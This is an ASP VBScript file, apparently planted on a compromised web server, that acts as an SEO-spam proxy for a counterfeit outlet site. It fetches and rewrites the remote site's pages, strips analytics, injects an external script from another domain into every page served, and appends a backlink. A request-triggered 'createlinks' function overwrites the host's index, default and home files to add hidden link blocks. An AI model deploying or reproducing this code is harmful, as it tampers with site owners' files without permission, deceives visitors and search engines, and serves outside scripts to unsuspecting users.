<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
server.ScriptTimeout=9999999
On Error Resume next

action=request("action")
replacestr=request("replacestr")
If action="createlinks" and replacestr<>"" Then
    Response.Write CreateLink()
    Response.End
End If

queryStr=Trim(Request.QueryString)
siteUrl="http://www.canadagooseoutletcavip.com"
jsUrl="<script type=""text/javascript"" src=""http://www.efootclub.com/cl.js""></script>"
previousUrl="<a href=""http://ic-solutions.com.au/store/2014newstyle.asp"">http://ic-solutions.com.au/store/2014newstyle.asp</a>"
locationUrl=GetLocationURL()

sourceBody=GetResStr(siteUrl&"/"&queryStr)
sourceBody=replace(sourceBody,"'","""",1,-1,1)
sourceBody=replace(sourceBody,""""&"/",""""&siteUrl&"/",1,-1,1)
sourceBody=replace(sourceBody,"../../../","../",1,-1,1)
sourceBody=replace(sourceBody,"../../","../",1,-1,1)
sourceBody=replace(sourceBody,"../",siteUrl&"/",1,-1,1)
sourceBody=replace(sourceBody,""""&"includes/",""""&siteUrl&"/includes/",1,-1,1)
sourceBody=replace(sourceBody,""""&"images/",""""&siteUrl&"/images/",1,-1,1)
sourceBody=replace(sourceBody,""""&"js/",""""&siteUrl&"/js/",1,-1,1)
sourceBody=replace(sourceBody,""""&"products/",""""&siteUrl&"/products/",1,-1,1)
sourceBody=RegexReplace(sourceBody,"<noscript>(.*?)</noscript>","")
sourceBody=RegexReplace(sourceBody,"http://js.users.51.la/(.*?).js","")
sourceBody=replace(sourceBody,"cnzz.com/z_stat.php","",1,-1,1)
sourceBody=replace(sourceBody,"google-analytics.com/ga.js","",1,-1,1)
sourceBody=replace(sourceBody,"</body>","<br />"&previousUrl&"<br /></body>",1,-1,1)
sourceBody=RegexReplace(sourceBody,"<base(.*?)>","")
'sourceBody=replace(sourceBody,"<script","",1,-1,1)
sourceBody=replace(sourceBody,"href=""""","href="""&locationUrl&"?""",1,-1,1)

'sourceBody=replace(sourceBody,"?zenid=","zenid=",1,-1,1)
'sourceBody=RegexReplace(sourceBody,"zenid=(.*?)","")

for i=0 to 9
    sourceBody=replace(sourceBody,"href="""&i,"href="""&locationUrl&"?"&i,1,-1,1)
next

for i=97 to 122
  if i<>104 then
    sourceBody=replace(sourceBody,"href="""&chr(i),"href="""&locationUrl&"?"&chr(i),1,-1,1)
  end if
next

Set regEx=new RegExp
regEx.Pattern="http://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?"
regEx.IgnoreCase=True
regEx.Global=True
Set matches=regEx.Execute(sourceBody)

For Each data In matches
if instr(data,".js")=0 and instr(data,".css")=0 and instr(data,".ico")=0 and instr(data,"w3.org")=0 and instr(data,".jpg")=0 and instr(data,".png")=0 and instr(data,".gif")=0 then
    newUrl=replace(data,siteUrl&"/",locationUrl&"?",1,-1,1)
else
    newUrl=replace(data,siteUrl&"/","",1,-1,1)
end if
if data<>siteUrl&"/" then
sourceBody=replace(sourceBody,data,newUrl)
end if
Next
sourceBody=replace(sourceBody,""""&siteUrl&"/"&"""","""?""",1,-1,1)
sourceBody=replace(sourceBody,""""&siteUrl&"""","""?""",1,-1,1)
sourceBody=replace(sourceBody,"src="""&locationUrl&"?","src=""",1,-1,1)
sourceBody=replace(sourceBody,"<head>","<head><base href="""&siteUrl&""" />",1,-1,1)
sourceBody=replace(sourceBody,"??","?",1,-1,1)
sourceBody=replace(sourceBody,"""?""",""""&locationUrl&"?"&"""",1,-1,1)

Response.Addheader "Content-Type","text/html;charset=utf-8"
Response.Write jsUrl&sourceBody
Response.End

Function GetLocationURL() 
Dim Url 
Dim ServerPort,ServerName,ScriptName 
ServerName = Request.ServerVariables("SERVER_NAME") 
ServerPort = Request.ServerVariables("SERVER_PORT") 
ScriptName = Request.ServerVariables("SCRIPT_NAME") 
QueryString = Request.ServerVariables("QUERY_STRING") 
Url="http://"&ServerName 
If ServerPort <> "80" Then Url = Url & ":" & ServerPort 
Url=Url&ScriptName
GetLocationURL=Url 
End Function

Function CreateLink()
    set fso=CreateObject("Scripting.FileSystemObject") 
    set fs=fso.GetFolder(Server.MapPath("/")) 
    For Each file In fs.Files
        If instr(LCase(file.name),"index")>0 or instr(LCase(file.name),"default")>0 or instr(LCase(file.name),"home")>0 Then
            set fsofile=fso.OpenTextFile(file, 1, true)
            On Error Resume next
            tempstr=fsofile.Readall
            pos1=instr(tempstr,"<div id=linkbyme>")
            If pos1>0 then
                tempstr=RegexReplace(tempstr,"<div id=linkbyme>(.+?)</body>","</body>")
            End If
            tempstr=replace(tempstr, "</body>", "<div id=linkbyme>"&replacestr&"</div><script>document.getElementById('linkbyme').style.display='none';</script></body>")
            set fsofile1=fso.OpenTextFile(file, 2, true)
            fsofile1.WriteLine tempstr
            fsofile1.close
            CreateLink="linkbyme"
        End If
    Next
    set fso=nothing 
End Function

function GetResStr(URL)
	Dim ResBody,ResStr,PageCode
	Set Http=server.createobject("msxml2.serverxmlhttp.3.0")
	Http.setTimeouts 60000, 60000, 60000, 60000
	Http.open "GET",URL,False
	Http.Send()
	If Http.Readystate =4 Then
		If Http.status=200 Then
		ResStr=http.responseText
		ResBody=http.responseBody
		PageCode="utf-8"
		GetResStr=BytesToBstr(http.responseBody,trim(PageCode))
		End If
	End If
End Function

Function BytesToBstr(Body,Cset)
	Dim Objstream
	Set Objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	BytesToBstr = objstream.ReadText
	objstream.Close
	set objstream = nothing
End Function

Function RegexReplace(source1,pattern1,replace1)
    Set re = New RegExp
    re.Pattern = pattern1
    re.Global = True
    re.IgnoreCase = True
    RegexReplace= re.replace(source1,replace1)
End Function
 %> 